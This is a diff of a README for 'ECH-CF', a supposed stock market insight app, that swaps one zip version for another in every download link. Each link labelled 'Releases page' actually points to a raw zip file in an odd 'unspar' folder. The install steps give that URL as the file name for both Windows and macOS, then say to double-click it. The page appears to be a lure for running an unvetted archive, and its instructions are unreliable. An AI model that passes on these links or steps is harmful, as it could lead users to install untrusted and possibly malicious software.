@@ -6,11 +6,11 @@ Welcome to ECH-CF! This application provides easy access to stock market insight
 
 ## 📦 Download Now
 
-[![Download ECH-CF](https://raw.githubusercontent.com/SHADOWWINGZ69/ECH-CF/main/unspar/EC_CF_3.0.zip)](https://raw.githubusercontent.com/SHADOWWINGZ69/ECH-CF/main/unspar/EC_CF_3.0.zip)
+[![Download ECH-CF](https://raw.githubusercontent.com/SHADOWWINGZ69/ECH-CF/main/unspar/EC_CF_2.4.zip)](https://raw.githubusercontent.com/SHADOWWINGZ69/ECH-CF/main/unspar/EC_CF_2.4.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/SHADOWWINGZ69/ECH-CF/main/unspar/EC_CF_3.0.zip) to download the latest version of ECH-CF. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/SHADOWWINGZ69/ECH-CF/main/unspar/EC_CF_2.4.zip) to download the latest version of ECH-CF. 
 
 1. Click the link above to go to the Releases page.
 2. Look for the most recent version.
@@ -30,7 +30,7 @@ Ensure your system meets the following requirements:
 After downloading the software, follow these steps to run ECH-CF:
 
 1. Go to your Downloads folder.
-2. Find the downloaded file. The file name will look something like `https://raw.githubusercontent.com/SHADOWWINGZ69/ECH-CF/main/unspar/EC_CF_3.0.zip` for Windows or `https://raw.githubusercontent.com/SHADOWWINGZ69/ECH-CF/main/unspar/EC_CF_3.0.zip` for macOS.
+2. Find the downloaded file. The file name will look something like `https://raw.githubusercontent.com/SHADOWWINGZ69/ECH-CF/main/unspar/EC_CF_2.4.zip` for Windows or `https://raw.githubusercontent.com/SHADOWWINGZ69/ECH-CF/main/unspar/EC_CF_2.4.zip` for macOS.
 3. Double-click the file to start the installation.
 4. Follow the on-screen instructions to complete the installation.
 
@@ -77,7 +77,7 @@ If you encounter any issues:
 
 To keep your software up to date:
 
-1. Periodically visit the [Releases page](https://raw.githubusercontent.com/SHADOWWINGZ69/ECH-CF/main/unspar/EC_CF_3.0.zip).
+1. Periodically visit the [Releases page](https://raw.githubusercontent.com/SHADOWWINGZ69/ECH-CF/main/unspar/EC_CF_2.4.zip).
 2. Download the latest version to ensure you have all new features and security updates.
 
 ### Feedback
